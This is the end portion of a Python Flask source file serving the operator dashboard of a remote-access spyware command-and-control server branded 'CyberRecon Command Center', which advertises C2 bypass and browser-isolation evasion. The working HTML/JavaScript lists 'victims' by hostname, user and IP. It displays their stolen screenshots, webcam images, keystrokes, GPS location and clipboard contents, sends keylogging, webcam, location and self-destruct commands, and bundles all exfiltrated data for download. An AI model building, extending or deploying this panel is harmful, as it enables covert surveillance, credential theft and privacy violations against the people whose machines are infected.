                </div>

                <!-- KEYSTROKES -->
                <div class="panel">
                    <h3>⌨️ KEYSTROKES</h3>
                    <div class="panel-content" id="keystrokes-panel">
                        <pre id="keystrokes-content">No keystrokes captured yet</pre>
                    </div>
                </div>

                <!-- GPS -->
                <div class="panel">
                    <h3>📍 GPS LOCATION</h3>
                    <div class="panel-content" id="gps-panel">
                        <div class="empty-state">
                            <div class="empty-state-icon">📍</div>
                            No location data yet
                        </div>
                    </div>
                </div>

                <!-- OUTPUT -->
                <div class="panel">
                    <h3>📋 COMMAND OUTPUT</h3>
                    <div class="panel-content" id="output-panel">
                        <pre id="output-content">whoami / system_info / process_list / clipboard results appear here</pre>
                    </div>
                </div>

                <!-- LOG -->
                <div class="panel log-panel">
                    <h3>📜 EVENT LOG</h3>
                    <div class="panel-content" id="logs-panel">
                        <div class="log-entry info">
                            <span class="log-time">[--:--:--]</span>
                            <span>[SYSTEM] Command Center initialized</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- NOTIFICATION -->
    <div class="notification" id="notification" style="display:none;">
        <div class="notification-icon">🔔</div>
        <div class="notification-content">
            <div class="notification-title" id="notif-title">Notification</div>
            <div class="notification-message" id="notif-msg"></div>
        </div>
    </div>

    <script>
        // ===== STATE =====
        let selectedVictim = null;
        let victims = {};
        let lastVictimHash = '';
        let lastKnownCounts = {
            screenshots: 0,
            webcam: 0,
            keystrokes: 0,
            locations: 0,
            outputs: 0
        };

        // ===== CLOCK =====
        function updateClock() {
            const now = new Date();
            document.getElementById('clock').textContent = 
                now.toLocaleTimeString('en-US', { hour12: false });
        }
        setInterval(updateClock, 1000);
        updateClock();

        // ===== NOTIFICATION =====
        function showNotification(title, message, type = 'success') {
            const notif = document.getElementById('notification');
            const titleEl = document.getElementById('notif-title');
            const msgEl = document.getElementById('notif-msg');
            
            titleEl.textContent = title;
            msgEl.textContent = message;
            
            notif.style.display = 'flex';
            notif.classList.remove('hide');
            
            // Border color based on type
            if (type === 'error') {
                notif.style.borderColor = 'var(--danger)';
                notif.style.boxShadow = '0 8px 32px rgba(255, 59, 92, 0.2)';
                titleEl.style.color = 'var(--danger)';
            } else if (type === 'warning') {
                notif.style.borderColor = 'var(--warning)';
                notif.style.boxShadow = '0 8px 32px rgba(255, 179, 64, 0.2)';
                titleEl.style.color = 'var(--warning)';
            } else {
                notif.style.borderColor = 'var(--success)';
                notif.style.boxShadow = '0 8px 32px rgba(0, 255, 136, 0.2)';
                titleEl.style.color = 'var(--success)';
            }
            
            // Auto-hide
            setTimeout(() => {
                notif.classList.add('hide');
                setTimeout(() => {
                    notif.style.display = 'none';
                    notif.classList.remove('hide');
                }, 400);
            }, 3000);
        }

        // ===== LOG =====
        function log(msg, type = 'info') {
            const panel = document.getElementById('logs-panel');
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            
            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
            entry.innerHTML = `<span class="log-time">[${time}]</span><span>${msg}</span>`;
            
            panel.insertBefore(entry, panel.firstChild);
            
            // Keep only 100 entries
            while (panel.children.length > 100) {
                panel.removeChild(panel.lastChild);
            }
        }

        // ===== VICTIM LIST =====
        function updateVictimList() {
            const dlBtn = document.getElementById('download-btn');
            if (dlBtn) {
                dlBtn.disabled = !selectedVictim;
            }

            const list = document.getElementById('victim-list');
            list.innerHTML = '';
            
            const arr = Object.values(victims);
            if (arr.length === 0) {
                list.innerHTML = `
                    <div style="color:var(--text-muted);font-size:12px;padding:12px;text-align:center;">
                        <div style="font-size:24px;opacity:0.3;margin-bottom:8px;">🔍</div>
                        Waiting for victims...
                    </div>
                `;
                return;
            }
            
            arr.forEach(v => {
                const card = document.createElement('div');
                card.className = `victim-card ${v.id === selectedVictim ? 'active' : ''}`;
                const statusClass = v.status === 'online' ? 'status-online' : 'status-offline';
                const statusIcon = v.status === 'online' ? '🟢' : '🔴';
                
                card.innerHTML = `
                    <h4>💻 ${v.hostname}</h4>
                    <p>🆔 ${v.id}</p>
                    <p>🖥️ ${v.os} | 👤 ${v.user}</p>
                    <p>🌐 ${v.ip}</p>
                    <p class="${statusClass}">${statusIcon} ${v.status}</p>
                `;
                
                card.onclick = () => {
                    selectedVictim = v.id;
                    document.getElementById('download-btn').disabled = false;
                    
                    // Reset counters
                    lastKnownCounts = {
                        screenshots: 0,
                        webcam: 0,
                        keystrokes: 0,
                        locations: 0,
                        outputs: 0
                    };
                    
                    // Clear panels
                    document.getElementById('screenshots-panel').innerHTML = `
                        <div class="empty-state">
                            <div class="empty-state-icon">📸</div>
                            No screenshots yet
                        </div>`;
                    document.getElementById('webcam-panel').innerHTML = `
                        <div class="empty-state">
                            <div class="empty-state-icon">📷</div>
                            No webcam captures yet
                        </div>`;
                    document.getElementById('keystrokes-content').textContent = 'No keystrokes captured yet';
                    document.getElementById('gps-panel').innerHTML = `
                        <div class="empty-state">
                            <div class="empty-state-icon">📍</div>
                            No location data yet
                        </div>`;
                    document.getElementById('output-content').textContent = 'whoami / system_info / process_list / clipboard results appear here';
                    
                    updateVictimList();
                    log(`Selected victim: ${v.hostname} (${v.id})`, 'info');
                    showNotification('Victim Selected', `${v.hostname} • ${v.os}`, 'success');
                };
                list.appendChild(card);
            });
        }

        // ===== DOWNLOAD ALL DATA =====
        async function downloadAllData() {
            if (!selectedVictim) {
                showNotification('Error', 'Select a victim first', 'error');
                return;
            }

            const btn = document.getElementById('download-btn');
            const originalText = btn.innerHTML;

            btn.classList.add('downloading');
            btn.innerHTML = 'PREPARING ZIP...';

            try {
                const link = document.createElement('a');
                link.href = `/download-all/${selectedVictim}?t=${Date.now()}`;
                link.download = '';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);

                log(`Downloading all data for ${selectedVictim}...`, 'info');
                showNotification('Download Started', 'ZIP file is being prepared', 'success');

                setTimeout(() => {
                    btn.classList.remove('downloading');
                    btn.innerHTML = originalText;
                }, 3000);
            } catch (e) {
                btn.classList.remove('downloading');
                btn.innerHTML = originalText;
                log(`Download failed: ${e}`, 'error');
                showNotification('Download Failed', e.message, 'error');
            }
        }

        // ===== REFRESH VICTIMS =====
        async function refreshVictims() {
            try {
                const resp = await fetch('/victims?t=' + Date.now());
                const data = await resp.json();
                
                const newHash = JSON.stringify(
                    data.victims.map(v => v.id + v.status).sort()
                );
                
                document.getElementById('metric-victims').textContent = data.count;
                
                // Only update list if changed (prevents flicker)
                if (newHash !== lastVictimHash) {
                    const oldCount = Object.keys(victims).length;
                    lastVictimHash = newHash;
                    victims = {};
                    data.victims.forEach(v => { victims[v.id] = v; });
                    updateVictimList();
                    
                    // Notify if new victim appeared
                    if (data.count > oldCount && oldCount > 0) {
                        const newVictim = data.victims[data.victims.length - 1];
                        showNotification('New Victim!', `${newVictim.hostname} connected`, 'success');
                    }
                }
                
                // Auto-select first victim
                if (!selectedVictim && data.count > 0) {
                    selectedVictim = data.victims[0].id;
                    updateVictimList();
                    log(`Auto-selected victim: ${data.victims[0].hostname}`, 'success');
                }
                
                // Refresh exfil data
                if (selectedVictim) {
                    await refreshExfilData();
                }
            } catch (e) {
                console.error('Victims refresh error:', e);
            }
        }

        // ===== REFRESH EXFIL DATA =====
        async function refreshExfilData() {
            if (!selectedVictim) return;
            try {
                const resp = await fetch(`/exfil-data/${selectedVictim}?t=` + Date.now());
                if (!resp.ok) return;
                const data = await resp.json();
                
                // === SCREENSHOTS ===
                const ssCount = data.screenshots ? data.screenshots.length : 0;
                if (ssCount > 0 && ssCount !== lastKnownCounts.screenshots) {
                    const last = data.screenshots[data.screenshots.length - 1];
                    const ts = encodeURIComponent(last.ts);
                    document.getElementById('screenshots-panel').innerHTML =
                        `<img src="/latest_screenshot/${selectedVictim}?t=${ts}" alt="screenshot">`;
                    document.getElementById('metric-screenshots').textContent = ssCount;
                    lastKnownCounts.screenshots = ssCount;
                }
                
                // === WEBCAM ===
                const wcCount = data.webcam ? data.webcam.length : 0;
                if (wcCount > 0 && wcCount !== lastKnownCounts.webcam) {
                    const last = data.webcam[data.webcam.length - 1];
                    const ts = encodeURIComponent(last.ts);
                    document.getElementById('webcam-panel').innerHTML =
                        `<img src="/latest_webcam/${selectedVictim}?t=${ts}" alt="webcam">`;
                    document.getElementById('metric-webcam').textContent = wcCount;
                    lastKnownCounts.webcam = wcCount;
                }
                
                // === KEYSTROKES ===
                const klCount = data.keystrokes ? data.keystrokes.length : 0;
                if (klCount > 0 && klCount !== lastKnownCounts.keystrokes) {
                    let text = '';
                    data.keystrokes.forEach(k => { text += k.data; });
                    document.getElementById('keystrokes-content').textContent = text;
                    document.getElementById('metric-keystrokes').textContent = klCount;
                    lastKnownCounts.keystrokes = klCount;
                }
                
                // === GPS ===
                const locCount = data.locations ? data.locations.length : 0;
                if (locCount > 0 && locCount !== lastKnownCounts.locations) {
                    const loc = data.locations[data.locations.length - 1].data;
                    renderGPS(loc);
                    lastKnownCounts.locations = locCount;
                }
                
                // === OUTPUTS ===
                const outCount = data.outputs ? data.outputs.length : 0;
                if (outCount > 0 && outCount !== lastKnownCounts.outputs) {
                    const last = data.outputs[data.outputs.length - 1];
                    let text = `[${last.ts}] ${last.type.toUpperCase()}\n`;
                    text += '═'.repeat(50) + '\n';
                    if (typeof last.data === 'object') {
                        text += JSON.stringify(last.data, null, 2);
                    } else {
                        text += String(last.data);
                    }
                    document.getElementById('output-content').textContent = text;
                    lastKnownCounts.outputs = outCount;
                }
                
                // Total exfil
                const totalCount = ssCount + wcCount + klCount + locCount;
                document.getElementById('metric-exfil').textContent = totalCount;
                
            } catch (e) {
                console.error('Exfil refresh error:', e);
            }
        }

        // ===== GPS RENDER =====
        function renderGPS(loc) {
            const panel = document.getElementById('gps-panel');
            
            if (typeof loc === 'string') {
                try { loc = JSON.parse(loc); } catch(e) { return; }
            }
            
            const lat = parseFloat(loc.latitude);
            const lon = parseFloat(loc.longitude);
            
            if (loc.error || isNaN(lat) || isNaN(lon) || (lat === 0 && lon === 0)) {
                panel.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-state-icon">⚠️</div>
                        ${loc.error || 'Location unavailable'}
                    </div>`;
                return;
            }
            
            const accuracy = loc.accuracy_m ? `±${Math.round(loc.accuracy_m)}m` : 'Unknown';
            const source = loc.source || 'Unknown';
            const d = 0.01;
            const bbox = `${(lon - d).toFixed(6)},${(lat - d).toFixed(6)},${(lon + d).toFixed(6)},${(lat + d).toFixed(6)}`;
            const mapUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${bbox}&layer=mapnik&marker=${lat},${lon}`;
            const osmLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=15/${lat}/${lon}`;
            
            panel.innerHTML = `
                <div class="gps-info">
                    <div class="gps-coords">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
                    <div class="gps-meta">📍 <span id="gps-place">Locating...</span> • Accuracy: ${accuracy}</div>
                    <iframe src="${mapUrl}" style="width:100%;height:200px;border-radius:8px;border:1px solid var(--border);display:block;" loading="lazy"></iframe>
                    <div class="gps-details">
                        <div><strong>Source:</strong> <span>${source}</span></div>
                        ${loc.ip ? `<div><strong>IP:</strong> <span>${loc.ip}</span></div>` : ''}
                        <div style="margin-top:6px;">
                            <a href="${osmLink}" target="_blank" style="color:var(--accent);text-decoration:none;">
                                🔗 Open interactive map →
                            </a>
                        </div>
                    </div>
                </div>
            `;
            
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=14`)
                .then(r => r.json())
                .then(geo => {
                    const el = document.getElementById('gps-place');
                    if (el && geo.display_name) {
                        el.textContent = geo.display_name.split(',').slice(0, 3).join(',').trim();
                    } else if (el) {
                        el.textContent = 'Unknown';
                    }
                })
                .catch(() => {
                    const el = document.getElementById('gps-place');
                    if (el) el.textContent = 'Unknown';
                });
        }

        // ===== SEND COMMAND =====
        async function sendCommand() {
            if (!selectedVictim) { 
                showNotification('Error', 'Select a victim first', 'error');
                return; 
            }
            
            const cmd = document.getElementById('cmd-select').value;
            const cmdNames = {
                screenshot: '📸 Screenshot',
                webcam_snap: '📷 Webcam',
                keylog_start: '⌨️ Keylog Start',
                keylog_stop: '⌨️ Keylog Stop',
                clipboard_get: '📋 Clipboard',
                gps_locate: '📍 GPS',
                process_list: '⚙️ Process List',
                system_info: '💻 System Info',
                whoami: '👤 Whoami',
                self_destruct: '💀 Self Destruct'
            };
            
            try {
                const resp = await fetch(`/command/${selectedVictim}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: cmd})
                });
                await resp.json();
                log(`Command queued: ${cmdNames[cmd] || cmd}`, 'success');
                showNotification('Command Sent', cmdNames[cmd] || cmd, 'success');
            } catch (e) {
                log(`Failed to send command: ${e}`, 'error');
                showNotification('Command Failed', e.message, 'error');
            }
        }

        // ===== INITIALIZE =====
        setInterval(refreshVictims, 2000);
        refreshVictims();
        log('Command Center initialized • Polling active', 'info');
    </script>
</body>
</html>
"""

@app.route("/dashboard")
def dashboard():
    return render_template_string(DASHBOARD_HTML)

if __name__ == "__main__":
    print("=" * 60)
    print("  ⚡ CyberRecon Command Center")
    print("  Mandiant QR C2 Bypass • Browser Isolation Evasion")
    print("=" * 60)
    print(f"  REST API:    http://0.0.0.0:8443")
    print(f"  Dashboard:   http://0.0.0.0:8443/dashboard")
    print("=" * 60)
    app.run(host="0.0.0.0", port=8443, debug=False, threaded=True)